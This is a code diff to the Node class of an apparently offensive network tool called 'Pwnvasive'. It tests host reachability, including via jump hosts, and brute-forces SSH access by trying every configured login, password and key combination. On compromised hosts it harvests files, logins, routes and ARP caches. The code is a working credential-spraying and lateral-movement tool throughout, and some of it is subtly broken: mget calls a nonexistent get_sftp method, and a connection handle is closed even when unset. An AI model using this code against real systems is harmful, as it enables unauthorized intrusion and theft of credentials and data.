@@ -24,21 +24,6 @@ logging.basicConfig()
 logging.getLogger("asyncio").setLevel(logging.WARNING)
 
 
-class States(Enum):
-    INVENTORIED = 1
-    REACHED = 2
-    CONNECTED = 3
-    IDENTIFIED = 4
-    HARVESTED = 5
-
-async def gather_limited(n, *tasks, return_exceptions=False):
-    semaphore = asyncio.Semaphore(n)
-    async def _task(t):
-        async with semaphore:
-            return await t
-    return await asyncio.gather(*(_task(t) for t in tasks),
-                                return_exceptions=return_exceptions)
-
 class JSONEnc(json.JSONEncoder):
     def default(self, o):
         if hasattr(o, "__json__"):
@@ -52,6 +37,9 @@ class NoCredsFound(PwnvasiveException):
         return f"{self.__class__.__name__}: no creds found for {self.args[0]}"
 
 class OSNotIdentified(PwnvasiveException):
+    pass
+
+class NodeUnreachable(PwnvasiveException):
     pass
 
 class OS(object):
@@ -371,9 +359,9 @@ class Node(Mapping):
     _fields = {
         "ip":                  ("127.0.0.1", str),
         "port":                (22, int),
-        "controlled":          (False, bool),
+        "controlled":          (None, bool),
         "hostname":            (None, str),
-        "reachable":           (False, bool),
+        "reachable":           (None, bool),
         "jump_host":           (None, str),
         "routes":              ([], list),
         "arp_cache":           ({}, dict),
@@ -385,10 +373,18 @@ class Node(Mapping):
 
     def __init__(self, **kargs):
         super().__init__(**kargs)
-        self.state = States.INVENTORIED
-        self.session = None
+        self._reached = self.values.get("reachable")
+        self._session = None
+        self._sftp = None
+        self._os = None
+        self._semaphore_reached = asyncio.Semaphore(1)
+        self._semaphore_session = asyncio.Semaphore(1)
+        self._semaphore_sftp = asyncio.Semaphore(1)
+        self._semaphore_os = asyncio.Semaphore(1)
+        self._semaphore_ssh_limit = asyncio.Semaphore(10) # limit to 10 concurrent ssh operations
+
         if self.values.get("os") == "linux":
-            self.os = Linux(self)
+            self._os = Linux(self)
 
     def __repr__(self):
         other =[]
@@ -397,62 +393,42 @@ class Node(Mapping):
             other.append(f"username={username}")
         other.append(f"files={len(self.files)}")
         return self.summary(exclude=["files", "routes", "arp_cache", "tested_credentials", "working_credentials"], other=other)
+
     @property
     def nodename(self):
         return self.hostname or self.ip
 
 
-    def ensure(state):
-        def deco(func):
-            @functools.wraps(func)
-            async def wrapped(self, *args, **kargs):
-                if self.state.value < state.value:
-                    await getattr(self, f"ensure_{state.name}")()
-                return await func(self, *args, **kargs)
-            return wrapped
-        return deco
-
-    def skip_if(state):
-        def deco(func):
-            @functools.wraps(func)
-            async def wrapped(self, *args, **kargs):
-                if self.state.value >= state.value:
-                    return True
-                return await func(self, *args, **kargs)
-            return wrapped
-        return deco
-
-
-    @skip_if(States.INVENTORIED)
-    async def ensure_INVENTORIED(self):
-        pass
-
-    @skip_if(States.REACHED)
-    async def ensure_REACHED(self):
-        if self.jump_host is None:
-            try:
-                r,w=await asyncio.open_connection(self.ip, self.port)
-            except OSError as e:
-                if e.errno == 111:
-                    raise Exception(f"Cannot connect to {self.shortname}")
-                raise
-            w.close()
-        else:
-            try:
-                jh = self.config.nodes[self.jump_host]
-            except KeyError:
-                raise Exception(f"Jump host not found in node list: {self.jump_host}")
-            jhs = await jh.connect()
-            try:
-                c,s = await jhs.create_connection(asyncssh.SSHTCPSession, self.ip,self.port)
-            except asyncssh.ChannelOpenError:
-                raise Exception(f"Cannot connect to {self.shortname} from {jh.shortname}")
-            c.close()
-        self.state = States.REACHED
-        if not self.reachable:
-            self.values["reachable"] = True
-            self.config.notify(EventNodeReached(self))
-        return True
+    async def get_reached(self):
+        async with self._semaphore_reached:
+            if self._reached is None:
+                if self.jump_host is None:
+                    try:
+                        r,w=await asyncio.open_connection(self.ip, self.port)
+                    except OSError as e:
+                        if e.errno != 111:
+                            raise
+                        self._reached = False
+                    else:
+                        self._reached = True
+                    w.close()
+                else:
+                    try:
+                        jh = self.config.nodes[self.jump_host]
+                    except KeyError:
+                        raise Exception(f"Jump host not found in node list: {self.jump_host}")
+                    jhs = await jh.connect()
+                    try:
+                        c,s = await jhs.create_connection(asyncssh.SSHTCPSession, self.ip,self.port)
+                    except asyncssh.ChannelOpenError:
+                        self._reached = False
+                    else:
+                        self._reached = True
+                    c.close()
+                self.values["reachable"] = self._reached
+                if self._reached:
+                    self.config.notify(EventNodeReached(self))
+            return self._reached
 
     async def _test_creds(self, **creds):
         use_creds = creds.copy()
@@ -465,56 +441,64 @@ class Node(Mapping):
         else:
             jh = None
         try:
-            sess = await asyncssh.connect(host=self.ip, port=self.port, options=opt, tunnel=jh)
-        except Exception as e:
+            async with self._semaphore_ssh_limit:
+                sess = await asyncssh.connect(host=self.ip, port=self.port, options=opt, tunnel=jh)
+        except asyncssh.PermissionDenied:
             return creds,False,None
         return creds,True,sess
 
-    @skip_if(States.CONNECTED)
-    @ensure(States.REACHED)
-    async def ensure_CONNECTED(self):
-        if not self.working_credentials:
-            c0 = [{"username":l.login} for l in self.config.logins]
-            c1 = [{"username":l.login, "password":p.password}
-                  for l in self.config.logins for p in self.config.passwords]
-            c2 = [{"username":l.login, "client_keys": s.sshkey}
-                  for l in self.config.logins for s in self.config.sshkeys if s._sshkey]
-            creds = (c for c in c0+c1+c2 if c not in self.tested_credentials)
-            res = await asyncio.gather(*[self._test_creds(**c) for c in creds])
+    async def get_session(self):
+        reached = await self.get_reached()
+        if not reached:
+            raise NodeUnreachable(f"cannot reach {self.shortname}")
+        async with self._semaphore_session:
+            if self._session is None:
+                if not self.working_credentials:
+                    c0 = [{"username":l.login} for l in self.config.logins]
+                    c1 = [{"username":l.login, "password":p.password}
+                          for l in self.config.logins for p in self.config.passwords]
+                    c2 = [{"username":l.login, "client_keys": s.sshkey}
+                          for l in self.config.logins for s in self.config.sshkeys if s._sshkey]
+                    creds = (c for c in c0+c1+c2 if c not in self.tested_credentials)
+                    res = await asyncio.gather(*[self._test_creds(**c) for c in creds])
+                    self.tested_credentials.extend([cred for cred,r,_ in res if not r])
+                    self.working_credentials.extend([cred for cred,r,_ in res if r])
+                    if self.working_credentials:
+                        self.values["controlled"] = True
+                        for _,r,sess in res:
+                            if r:
+                                self._session = sess
+                                break
+                        self.config.notify(EventNodeConnected(self))
+                    else:
+                        self.values["controlled"] = False
+                        raise NoCredsFound(self.shortname)
+                else:
+                    _,_,sess = await self._test_creds(**self.working_credentials[0])
+                    self._session = sess
+            return self._session
 
-            self.tested_credentials.extend([cred for cred,r,_ in res if not r])
-            self.working_credentials.extend([cred for cred,r,_ in res if r])
-            if self.working_credentials:
-                for _,r,sess in res:
-                    if r:
-                        self.session = sess
-                        break
-                self.config.notify(EventNodeConnected(self))
-            else:
-                raise NoCredsFound(self.shortname)
-            return None
-        else:
-            _,_,sess = await self._test_creds(**self.working_credentials[0])
-            self.session = sess
-        self.state = States.CONNECTED
-        return self.session
+    async def get_os(self):
+        async with self._semaphore_os:
+            if self._os is None:
+                session = await self.get_session()
+                async with self._semaphore_ssh_limit:
+                    r = await session.run("uname -o")
+                if "linux" in r.stdout.lower():
+                    self._os = Linux(self)
+                    self.values["os"] = "linux"
+                    self.values["hostname"] = await self._os.get_hostname()
+                    self.config.notify(EventNodeIdentified(self))
+                else:
+                    raise OSNotIdentified(f"Could not recognize os [{r.stdout.strip()}]")
+            return self._os
 
-    @skip_if(States.IDENTIFIED)
-    @ensure(States.CONNECTED)
-    async def ensure_IDENTIFIED(self):
-        if self.os is None:
-            r = await self.session.run("uname -o")
-            if "linux" in r.stdout.lower():
-                self.os = Linux(self)
-                self.values["os"] = "linux"
-                self.state = States.IDENTIFIED
-                self.values["hostname"] = await self.os.get_hostname()
-                self.config.notify(EventNodeIdentified(self))
-                return True
-            else:
-                raise OSNotIdentified(f"Could not recognize os [{r.stdout.strip()}]")
-
-
+    async def get_sftp_session(self):
+        async with self._semaphore_sftp:
+            if self._sftp is None:
+                session = await self.get_session()
+                self._sftp = await session.start_sftp_client()
+        return self._sftp
 
     def remember_file(self, path, content):
         c = base64.b85encode(zlib.compress(content)).decode("ascii")
@@ -533,85 +517,78 @@ class Node(Mapping):
             c2 = zlib.decompress(base64.b85decode(c.encode("ascii")))
             yield f,c2
 
-    @ensure(States.CONNECTED)
     async def connect(self):
-        return self.session
+        return await self.get_session()
 
-    @ensure(States.CONNECTED)
+    async def identify(self):
+        await self.get_os()
+
     async def run(self, cmd):
-        r = await self.session.run(cmd)
+        session = await self.get_session()
+        async with self._semaphore_ssh_limit:
+            r = await session.run(cmd)
         return r.stdout, r.stderr
 
-    @ensure(States.CONNECTED)
     async def glob(self, pattern):
-        async with self.session.start_sftp_client() as sftp:
+        sftp = await self.get_sftp_session()
+        async with self._semaphore_ssh_limit:
             return await sftp.glob(pattern)
 
-    @ensure(States.CONNECTED)
     async def get(self, path):
-        async with self.session.start_sftp_client() as sftp:
-            f = await sftp.open(path, "rb")
-            content = await f.read()
+        sftp = await self.get_sftp_session()
+        async with self._semaphore_ssh_limit:
+            async with sftp.open(path, "rb") as f:
+                content = await f.read()
         self.remember_file(path, content)
         return content
 
-
-    async def _sftp_get_file(self, sftp, fname):
-        f = await sftp.open(fname, "rb")
-        content = await f.read()
-        self.remember_file(fname, content)
-        return content
-
-    @ensure(States.IDENTIFIED)
-    async def mget(self, *paths, concurrency=10):
-        async with self.session.start_sftp_client() as sftp:
-            try:
+    async def mget(self, *paths):
+        sftp = await self.get_sftp()
+        try:
+            async with self._semaphore_ssh_limit:
                 lst = await sftp.glob(paths, error_handler=lambda x:None)
-            except asyncssh.SFTPNoSuchFile:
-                return {}
-            filtered_lst = [f for f in lst if f not in self.files]
-            contents = await gather_limited(
-                concurrency,
-                *(self._sftp_get_file(sftp, f) for f in filtered_lst),
-                return_exceptions=True)
+        except asyncssh.SFTPNoSuchFile:
+            return {}
+        filtered_lst = [f for f in lst if f not in self.files]
+        contents = await asyncio.gather(*(self.get(f) for f in filtered_lst), return_exceptions=True)
         d = { k:v for k,v in zip(filtered_lst, contents) if type(v) is bytes }
         return d
 
-
-    @ensure(States.IDENTIFIED)
     async def collect_files(self, lst=None):
         if lst is None:
             fname_coll = await self.get_filename_collection()
             lst = [f.path for f in fname_coll]
         return await self.mget(*lst)
 
-    @ensure(States.IDENTIFIED)
     async def collect_logins(self):
-        return await self.os.collect_logins()
+        os = await self.get_os()
+        return await os.collect_logins()
 
-    @ensure(States.IDENTIFIED)
     async def collect_filenames(self):
-        return await self._os.collect_filenames()
+        os = await self.get_os()
+        return await os.collect_filenames()
 
-    @ensure(States.IDENTIFIED)
     async def collect_infos(self):
-        return await self.os.get_all()
+        os = await self.get_os()
+        return await os.get_all()
 
-    @ensure(States.IDENTIFIED)
     async def collect_routes(self):
-        routes = await self.os.get_routes()
+        os = await self.get_os()
+        routes = await os.get_routes()
         self.values["routes"] = routes
         self.config.notify(EventNodeRoute(self))
         return routes
 
-    @ensure(States.IDENTIFIED)
     async def collect_arp_cache(self):
-        cache = await self.os.get_arp_cache()
+        os = await self.get_os()
+        cache = await os.get_arp_cache()
         self.values["arp_cache"] = cache
         self.config.notify(EventNodeARPCache(self))
         return cache
 
-
+    async def get_filename_collection(self):
+        os = await self.get_os()
+        return os.filename_collection
 
 
 
